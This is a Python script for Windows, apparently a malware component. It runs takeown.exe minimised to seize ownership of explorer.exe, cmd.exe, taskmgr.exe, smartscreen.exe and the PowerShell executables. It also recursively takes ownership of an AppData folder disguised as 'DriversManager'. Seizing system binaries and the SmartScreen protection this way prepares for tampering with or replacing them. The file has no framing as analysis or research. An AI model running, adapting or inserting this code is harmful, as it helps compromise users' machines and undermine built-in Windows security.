#!/usr/bin/python
#coding:utf-8
import os, sys

# GET THE ENVIRONMENT VARIABLES
letter_drive = os.environ["SystemDrive"]
current_user = os.environ["USERNAME"]

class GetOwn():
    """ Class defining the processes and directory to be appropriated """
    def __init__(self):
        self.processus_windir = ["explorer.exe", "notepad.exe"]
        self.processus_pshell = ["powershell.exe", "powershell_ise.exe"]
        self.processus_sysdir = ["taskmgr.exe", "cmd.exe", "smartscreen.exe"]
        self.directory_check  = ["{} {}\\Users\\{}\\AppData\\Roaming\\DriversManager {}"]
        self.processus_exec   = "START /MIN {}\\Windows\\System32\\takeown.exe /F".format(letter_drive)
        self.syntax_option    = "/R"
        self.directory3       = "{}\\Windows\\System32\\WindowsPowerShell\\v1.0\\".format(letter_drive)
        self.directory2       = "{}\\Windows\\System32\\".format(letter_drive)
        self.directory        = "{}\\Windows\\".format(letter_drive)
    # Function to get own explorer.exe on windows
    def proc(self):
        for x in self.processus_windir:
            self.processus_windir = x
            self.command_execute  = "{} {}{}".format(self.processus_exec, self.directory, x)
            os.system(self.command_execute)

        for x in self.processus_sysdir:
            self.processus_sysdir = x
            self.command_execute  = "{} {}{}".format(self.processus_exec, self.directory2, x)
            os.system(self.command_execute)

        for x in self.processus_pshell:
            self.processus_pshell = x
            self.command_execute  = "{} {}{}".format(self.processus_exec, self.directory3, x)
            os.system(self.command_execute)
    # Function to get own the directory destination and contains
    def dir(self):
        for x in self.directory_check:
            self.command_execute = x.format(self.processus_exec, letter_drive, current_user, self.syntax_option)
            os.system(self.command_execute)
